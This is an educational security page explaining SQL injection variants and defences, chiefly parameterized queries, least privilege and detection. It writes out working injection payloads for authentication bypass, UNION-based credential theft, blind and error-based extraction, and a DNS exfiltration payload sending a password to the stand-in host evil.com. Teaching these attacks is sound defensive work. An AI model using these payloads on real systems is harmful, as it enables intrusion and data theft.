---
title: "SQL Injection"
description: "How SQL injection works, all major variants, and why parameterized queries are the only reliable fix."
---

SQL injection (SQLi) is consistently one of the most impactful vulnerabilities in web applications. A successful attack can read all data in the database, modify or delete data, bypass authentication, and in some configurations execute OS commands.

## How It Works

SQL injection occurs when attacker-controlled input is concatenated directly into a SQL query. The database cannot distinguish between the intended query structure and the injected payload.

```javascript
// Vulnerable — string concatenation
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;

// Attacker input: admin@example.com' --
// Resulting SQL:
SELECT * FROM users WHERE email = 'admin@example.com' --'
// The -- comments out the rest; no password check needed
```

---

## Major Variants

### Classic (In-Band) SQLi

The result is returned directly in the HTTP response. The easiest to exploit.

```sql
-- Input: ' OR '1'='1
SELECT * FROM users WHERE email = '' OR '1'='1'
-- Returns all users

-- Input: ' UNION SELECT username, password FROM admins --
SELECT name, email FROM products WHERE id = '' UNION SELECT username, password FROM admins --
-- Appends admin credentials to the result
```

### Blind Boolean-Based SQLi

No data is returned directly, but the application behaves differently based on whether a condition is true or false. Used to extract data one bit at a time.

```sql
-- True condition: page loads normally
id=1 AND 1=1

-- False condition: page returns empty or errors
id=1 AND 1=2

-- Extract data character by character:
id=1 AND SUBSTRING(password,1,1)='a'  -- try each char until page loads
```

### Blind Time-Based SQLi

When there is no behavioral difference between true/false, attackers use time delays to exfiltrate data.

```sql
-- MySQL
id=1 AND SLEEP(5)  -- delays 5 seconds if vulnerable

-- PostgreSQL
id=1; SELECT pg_sleep(5)

-- Exfiltrate one bit:
id=1 AND IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0)
```

### Error-Based SQLi

Deliberately triggers database errors that contain data values in the error message.

```sql
-- MySQL example
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
-- Error: XPATH syntax error: '~8.0.32'
```

### Second-Order SQLi

Payload is stored in the database safely (correctly escaped at insert time), then retrieved and used unsafely in a later query.

```
Registration: username = admin'--   (stored correctly)
Password change: UPDATE users SET pass=? WHERE username='admin'--'
                                                       ↑ injected at retrieval
```

### Out-of-Band SQLi

Data is exfiltrated via a separate channel (DNS lookup, HTTP request). Used when in-band and blind techniques are blocked.

```sql
-- MySQL — triggers DNS lookup with data in subdomain
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.evil.com\\foo'))--
```

---

## The Fix: Parameterized Queries

Parameterized queries (prepared statements) separate code from data. The database compiles the query template first, then binds the user input as a typed value — it cannot be interpreted as SQL syntax.

```javascript
// Node.js + pg (PostgreSQL)
const result = await db.query(
  'SELECT * FROM users WHERE email = $1 AND password_hash = $2',
  [email, passwordHash]
);

// Node.js + mysql2
const [rows] = await db.execute(
  'SELECT * FROM users WHERE email = ? AND active = ?',
  [email, true]
);

// Python + psycopg2
cursor.execute(
  'SELECT * FROM users WHERE email = %s',
  (email,)  // note the comma — must be a tuple
);
```

**Key point:** The placeholder syntax varies by driver (`$1`, `?`, `%s`) but the mechanism is the same. The user input is never concatenated into the SQL string.

### ORMs

ORMs use parameterized queries internally for normal operations. However, most ORMs have escape hatches for raw SQL — these are just as vulnerable if you concatenate into them.

```javascript
// Sequelize
// ✓ Safe — ORM-generated query
User.findOne({ where: { email } });

// ✗ Vulnerable — raw query with concatenation
User.query(`SELECT * FROM users WHERE email = '${email}'`);

// ✓ Safe — raw query with parameterization
User.query('SELECT * FROM users WHERE email = $email', {
  bind: { email },
});
```

---

## Defense Layers

Parameterized queries are the primary defense. Add these layers for depth:

### Input Validation
Reject input that can't possibly be valid. An integer ID should only accept digits.

```javascript
const id = parseInt(req.params.id, 10);
if (isNaN(id) || id < 1) return res.status(400).send('Invalid ID');
```

### Least-Privilege Database Account
The application's database user should have only the permissions it needs:

```sql
-- Create a restricted app user
CREATE USER 'app'@'localhost' IDENTIFIED BY '...';
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'app'@'localhost';

-- Never grant:
-- GRANT ALL PRIVILEGES
-- GRANT FILE  (enables LOAD_FILE / INTO OUTFILE)
-- GRANT SUPER
```

### Error Handling
Never expose raw database errors to the client. Log them server-side; return a generic message.

```javascript
try {
  const result = await db.query(sql, params);
  return result;
} catch (err) {
  logger.error({ err, sql }, 'Database query failed');
  throw new Error('An unexpected error occurred');  // generic to client
}
```

### Web Application Firewall (WAF)
A WAF can detect and block common SQLi patterns, but it is not a substitute for parameterized queries. WAF rules can be bypassed; parameterized queries cannot be SQL-injected by definition.

---

## Detection

### Manual Testing
Inject a single quote `'` into every input field, URL parameter, and header. Look for:
- Database error messages
- Unexpected behavior (empty page, different content)
- Time delays (with `SLEEP()` payloads)

### Automated Tools
- **SQLMap** — automated SQLi detection and exploitation (use only on systems you own or have authorization for)
- **Burp Suite Scanner** — active scan with SQLi checks
- **OWASP ZAP** — open-source DAST scanner
- **Semgrep** — SAST rules for detecting string-concatenated queries in source code

### Code Review Patterns to Flag

```
# Grep for dangerous patterns in source:
grep -rn "query.*\+" --include="*.js"
grep -rn "f\"SELECT" --include="*.py"
grep -rn 'Sprintf.*SELECT' --include="*.go"
```
